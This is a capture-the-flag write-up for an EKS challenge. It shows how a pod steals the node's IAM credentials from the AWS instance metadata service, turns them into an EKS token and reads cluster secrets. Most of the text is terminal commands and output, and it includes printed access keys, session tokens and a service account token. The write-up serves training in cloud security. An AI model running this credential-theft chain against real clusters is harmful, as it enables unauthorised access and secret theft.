---
tags:
  - Kubernetes
  - AWSInstanceMetadataAPI
title: EKS Cluster Game - Pod Break
description: 
reference: https://eksclustergames.com/challenge/4
---

## Challenges

You're inside a vulnerable pod on an EKS cluster. Your pod's service-account has no permissions. Can you navigate your way to access the EKS Node's privileged service-account?

Please be aware: Due to security considerations aimed at safeguarding the CTF infrastructure, the node has restricted permissions

## Solution

### 1. can get the node IAM credential

```
root@wiz-eks-challenge:/proc# curl http://169.254.169.254/latest/meta-data/iam/security-credentials/  
eks-challenge-cluster-nodegroup-NodeInstanceRoleroot@wiz-eks-challenge:/proc# curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole
{"AccessKeyId":"ASIA2AVYNEVMWJLGBCB4","Expiration":"2025-05-18 08:14:19+00:00","SecretAccessKey":"FT6e8NBfWNyBqGnZjLCaDyuAqQJ1B5SDunQWH85N","SessionToken":"FwoGZXIvYXdzEMn//////////wEaDC/qjlRqiafdWr7BryK3Ae+P6yT0C02M7VGHjvEV6l1axZS5Jq8Ljf3vI661UPELbHzhKQfvJD8MTALvcsSNvjmsJ5GPs787YFTXzu0vlPabZ+PlwkBMZoa9fxtR6y3nmxN/i/XFKyrVNL1g2Rc0VzTb7N6ZUVBACAS7iLmC0ch0gc1Ru+vqnuYYLl3/pAzWRTR4qq4XWmiSSd8CsbPJU1481fd5dyh9tqH0PNDkDE6nOFINwcIAm2qJlnUXhSn/4AndCGE3rCjLkabBBjItGHShsOxMqFByItCbH2LIiz+gkK4n7DBqQUkOVVezVQmXF2e7Z8Y6uWiAK+q9"}
```

### 2. try to use that node IAM credential to obtain the EKS access token

```
root@wiz-eks-challenge:~/.aws# aws eks get-token --cluster-name localcfg
{
    "kind": "ExecCredential",
    "apiVersion": "client.authentication.k8s.io/v1beta1",
    "spec": {},
    "status": {
        "expirationTimestamp": "2025-05-18T07:39:51Z",
        "token": "k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vP0FjdGlvbj1HZXRDYWxsZXJJZGVudGl0eSZWZXJzaW9uPTIwMTEtMDYtMTUmWC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BU0lBMkFWWU5FVk02V1ZGUTRXUiUyRjIwMjUwNTE4JTJGdXMtd2VzdC0xJTJGc3RzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTA1MThUMDcyNTUxWiZYLUFtei1FeHBpcmVzPTYwJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCUzQngtazhzLWF3cy1pZCZYLUFtei1TZWN1cml0eS1Ub2tlbj1Gd29HWlhJdllYZHpFTWolMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkZ3RWFESW8zc0JnMSUyQm9kY0dmaXVseUszQVV2dCUyQkE4TVFTZ3JkTnhTQmRFZk91eUhwbzZ1bzN5dHFUMEhCcGRyS3pxTjhCMGkwUEFwdWNpWGRMNmI0SXd6d0JQNHJ1ejhVS3B6YmNiTUZ2bzRld0lDQnNVUXBLTnFzd2UlMkJJNldnNExoWFFpTnI3eDBscG13bEUxZHNOUmNYOGtTWFl3eDNkJTJCaSUyRjJ5dEUyR3hCU05WNjQlMkI1eDB0NFFZcVVJZ1dNSzZjMlRzZk0waWNHWUJZZCUyRmJtRUlPM1RoWGZGR1JPSUVuJTJGVFBNMEZ6d05odlNIaUQlMkYlMkJScXpMYzhVa1BaQ2V0a1lINW4lMkJIZFU4NTJVTlNqUGpLYkJCakl0ZmlvdGtMa1VJa3NqbFhRTkI3V0lZdjdua2NaTmdSUlRYaUliZU91b1p1VW5kWmt2SnlQeGhDandFSVo2JlgtQW16LVNpZ25hdHVyZT0xNTlmOTYxYzdjODc5NzQzOTdjZmZmN2ZiN2Q4MjJmMWI3Y2Y2ZDA4Y2IyODgzYmFmYzU5MzM2YWZmYzk3YjU5"
    }
}
```

## 3. understand a bit more about how the pod service account was created

encoded token:

```
root@wiz-eks-challenge:/var/run/secrets/kubernetes.io/serviceaccount# cat token 
eyJhbGciOiJSUzI1NiIsImtpZCI6ImRlOWJkNjUyNzI3ZjI4MGFlZTIwMzNiNmRlMDE4NDJjMGE2ODIxODMifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjIl0sImV4cCI6MTc0NzU1NzEzNSwiaWF0IjoxNzQ3NTUzNTM1LCJpc3MiOiJodHRwczovL29pZGMuZWtzLnVzLXdlc3QtMS5hbWF6b25hd3MuY29tL2lkL0MwNjJDMjA3QzhGNTBERTRFQzI0QTM3MkZGNjBFNTg5Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJjaGFsbGVuZ2U0Iiwic2VydmljZWFjY291bnQiOnsibmFtZSI6InNlcnZpY2UtYWNjb3VudC1jaGFsbGVuZ2U0IiwidWlkIjoiYWQ0NDg0OGQtN2I4ZC00Y2MxLThlMzAtNWIyM2M5YTUyYzQwIn19LCJuYmYiOjE3NDc1NTM1MzUsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpjaGFsbGVuZ2U0OnNlcnZpY2UtYWNjb3VudC1jaGFsbGVuZ2U0In0.gLjVLgYJpEox1E7WdVwDZv8pWOSQd7Nn0h32ZCbTAjZOKTtatrIi75m0WEvOOKUb_eWHkDTuLu2J0reRW-J3_x1vX41SgAinxK_1VsJRALD8A5FATFhEowCHYuAUulHuoFd8x0dyvejmIJXuDntJEbvArqOPrf0xGcmKfOw6bikDjDhiEK7Bnohl7P7wj70KRk9Km-2bV-z2-Fpyxf9gV1yYRtLIcjg_6EeTjo0Ewf5IGHN_I0UIV5jxNBJg2UtMT-8TP4h6Fpy0K4gDJyZlGzoisSVyqHTgLhJt5zoeZPzHBN-gf8ITA1SUpuuUqo5pDBU7S284I4HlzV-357krhw
```

decoded token:

> The issuer is the **AWS OIDC provider**

```
{
  "aud": [
    "https://kubernetes.default.svc"
  ],
  "exp": 1747557135,
  "iat": 1747553535,
  "iss": "https://oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589",
  "kubernetes.io": {
    "namespace": "challenge4",
    "serviceaccount": {
      "name": "service-account-challenge4",
      "uid": "ad44848d-7b8d-4cc1-8e30-5b23c9a52c40"
    }
  },
  "nbf": 1747553535,
  "sub": "system:serviceaccount:challenge4:service-account-challenge4"
}
```


### 4. Try to attach the EKSNodeRolePolicy

Failed.

```
root@wiz-eks-challenge:~/.kube# aws iam attach-role-policy --role-name eks-challenge-cluster-nodegroup-NodeInstanceRole --policy-arn arn:aws:iam::aws:policy/AmazonEKSWorkerNod
ePolicy

An error occurred (AccessDenied) when calling the AttachRolePolicy operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: iam:AttachRolePolicy on resource: role eks-challenge-cluster-nodegroup-NodeInstanceRole because no identity-based policy allows the iam:AttachRolePolicy action
```


### 5. Check the proc linux capabilities

No cap.

```
root@wiz-eks-challenge:/etc# cat /proc/1/status | grep Cap
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000000000000000
CapAmb: 0000000000000000
```


### 6. Verify the refreshed node IAM role auth session

```
root@wiz-eks-challenge:~/.aws# aws sts get-caller-identity
{
    "UserId": "AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282"
}
```


### 7. Try to assume other rules that have more permissions

Failed.

```
root@wiz-eks-challenge:~/.aws# aws sts assume-role --role-arn arn:aws:iam::688655246681:role/eksClusterRole --role-session-name MySession

An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::688655246681:role/eksClusterRole
root@wiz-eks-challenge:~/.aws# aws sts assume-role --role-arn arn:aws:iam::688655246681:role/eksNodeRole --role-session-name MySession

An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::688655246681:role/eksNodeRole
root@wiz-eks-challenge:~/.aws# aws sts assume-role --role-arn arn:aws:iam::688655246681:role/AWSServiceRoleForAmazonEKS --role-session-name MySession

An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::688655246681:role/AWSServiceRoleForAmazonEKS
```

### 8. Try to use NodeRole to access K8s API

Failed.

```
root@wiz-eks-challenge:~/.aws# aws eks update-kubeconfig --region us-west-1 --name localcfg

An error occurred (AccessDeniedException) when calling the DescribeCluster operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: eks:DescribeCluster on resource: arn:aws:eks:us-west-1:688655246681:cluster/localcfg
```


### 9. Try to get the eks token with another cluster name

> This act is hinted by the node role name : **eks-challenge-cluster**-nodegroup-NodeInstanceRole

We can call the k8s API with more permissions now!

```
}root@wiz-eks-challenge:~# aws eks get-token --cluster-name eks-challenge-cluster
{
    "kind": "ExecCredential",
    "apiVersion": "client.authentication.k8s.io/v1beta1",
    "spec": {},
    "status": {
        "expirationTimestamp": "2025-05-18T11:43:25Z",
        "token": "k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vP0FjdGlvbj1HZXRDYWxsZXJJZGVudGl0eSZWZXJzaW9uPTIwMTEtMDYtMTUmWC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BU0lBMkFWWU5FVk1ZNkRPVlg3RSUyRjIwMjUwNTE4JTJGdXMtd2VzdC0xJTJGc3RzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTA1MThUMTEyOTI1WiZYLUFtei1FeHBpcmVzPTYwJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCUzQngtazhzLWF3cy1pZCZYLUFtei1TZWN1cml0eS1Ub2tlbj1Gd29HWlhJdllYZHpFTXolMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkZ3RWFES0FFZGxoSE9kRmQydFdmZWlLM0FlRmFvUXVMVVhPOHhzdlJXZFdmYmR4JTJCNGZTcThjUUVkTWc1a29TQmE4SVFtJTJCRjdHT05JWHkyJTJGWmFaaHMzNjI2ODdtN1JZaHZndG93Y2hXdVdzSG9mdG03UlM0MVpxcmRkJTJCdDlsZ2Y4U0MzdnZNVVRWa3VWYlNtMmo4N2tkNU1VN3N3MjRKJTJCWE9uOTJnYWtJZ29YQzhBbUZBR1dRSzhrblk2dnZ3NHZHQVdPVjBHbmxTRlAyU3p4Tm9sRVRRWUxhUGhyMWhldnZHYVVHUzNqdlNnYVFYa0NiYjhFMldmdGJvbUxiam44JTJCdkNCNjJSeTYwdjVleWlnJTJGS2JCQmpJdFBzUWZPd0R1V2VGSmZrOTBxTHllcHdXJTJCVE1Xc2tnQVpURmhEYUZNTW1YQU1Gdm43bkVaOEFLT0VkTDE1JlgtQW16LVNpZ25hdHVyZT0xMDY5YjA1NmI0NjIyOWJjYWE3ZWZmMmQ0ZTgwNjUwMGJiNWQxOTljMzEyNWViMzJiMzk3YWNjZDQxZjhhZGI4"
    }
}

root@wiz-eks-challenge:~# export TOKEN=k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vP0FjdGlvbj1HZXRDYWxsZXJJZGVudGl0eSZWZXJzaW9uPTIwMTEtMDYtMTUmWC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BU0lBMkFWWU5FVk1ZNkRPVlg3RSUyRjIwMjUwNTE4JTJGdXMtd2VzdC0xJTJGc3RzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTA1MThUMTEyOTI1WiZYLUFtei1FeHBpcmVzPTYwJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCUzQngtazhzLWF3cy1pZCZYLUFtei1TZWN1cml0eS1Ub2tlbj1Gd29HWlhJdllYZHpFTXolMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkZ3RWFES0FFZGxoSE9kRmQydFdmZWlLM0FlRmFvUXVMVVhPOHhzdlJXZFdmYmR4JTJCNGZTcThjUUVkTWc1a29TQmE4SVFtJTJCRjdHT05JWHkyJTJGWmFaaHMzNjI2ODdtN1JZaHZndG93Y2hXdVdzSG9mdG03UlM0MVpxcmRkJTJCdDlsZ2Y4U0MzdnZNVVRWa3VWYlNtMmo4N2tkNU1VN3N3MjRKJTJCWE9uOTJnYWtJZ29YQzhBbUZBR1dRSzhrblk2dnZ3NHZHQVdPVjBHbmxTRlAyU3p4Tm9sRVRRWUxhUGhyMWhldnZHYVVHUzNqdlNnYVFYa0NiYjhFMldmdGJvbUxiam44JTJCdkNCNjJSeTYwdjVleWlnJTJGS2JCQmpJdFBzUWZPd0R1V2VGSmZrOTBxTHllcHdXJTJCVE1Xc2tnQVpURmhEYUZNTW1YQU1Gdm43bkVaOEFLT0VkTDE1JlgtQW16LVNpZ25hdHVyZT0xMDY5YjA1NmI0NjIyOWJjYWE3ZWZmMmQ0ZTgwNjUwMGJiNWQxOTljMzEyNWViMzJiMzk3YWNjZDQxZjhhZGI4
root@wiz-eks-challenge:~# kubectl auth can-i --list --token=$TOKEN
warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs   Resource Names     Verbs
serviceaccounts/token                           []                  [debug-sa]         [create]
selfsubjectaccessreviews.authorization.k8s.io   []                  []                 [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []                 [create]
pods                                            []                  []                 [get list]
secrets                                         []                  []                 [get list]
serviceaccounts                                 []                  []                 [get list]
                                                [/api/*]            []                 [get]
                                                [/api]              []                 [get]
                                                [/apis/*]           []                 [get]
                                                [/apis]             []                 [get]
                                                [/healthz]          []                 [get]
                                                [/healthz]          []                 [get]
                                                [/livez]            []                 [get]
                                                [/livez]            []                 [get]
                                                [/openapi/*]        []                 [get]
                                                [/openapi]          []                 [get]
                                                [/readyz]           []                 [get]
                                                [/readyz]           []                 [get]
                                                [/version/]         []                 [get]
                                                [/version/]         []                 [get]
                                                [/version]          []                 [get]
                                                [/version]          []                 [get]
podsecuritypolicies.policy                      []                  [eks.privileged]   [use]
```

### 10. Try to get the secret

```
root@wiz-eks-challenge:~# kubectl get serviceaccounts --token=$TOKEN
NAME                         SECRETS   AGE
default                      0         564d
service-account-challenge4   0         564d
root@wiz-eks-challenge:~# kubectl get serviceaccounts service-account-challenge4 -o yaml --token=$TOKEN
apiVersion: v1
kind: ServiceAccount
metadata:
  creationTimestamp: "2023-10-31T20:07:21Z"
  name: service-account-challenge4
  namespace: challenge4
  resourceVersion: "671862"
  uid: ad44848d-7b8d-4cc1-8e30-5b23c9a52c40
root@wiz-eks-challenge:~# kubectl get secrets -o yaml --token=$TOKEN
apiVersion: v1
items:
- apiVersion: v1
  data:
    flag: d2l6X2Vrc19jaGFsbGVuZ2V7b25seV9hX3JlYWxfcHJvX2Nhbl9uYXZpZ2F0ZV9JTURTX3RvX0VLU19jb25ncmF0c30=
  kind: Secret
  metadata:
    creationTimestamp: "2023-11-01T12:27:57Z"
    name: node-flag
    namespace: challenge4
    resourceVersion: "883574"
    uid: 26461a29-ec72-40e1-adc7-99128ce664f7
  type: Opaque
kind: List
metadata:
  resourceVersion: ""
```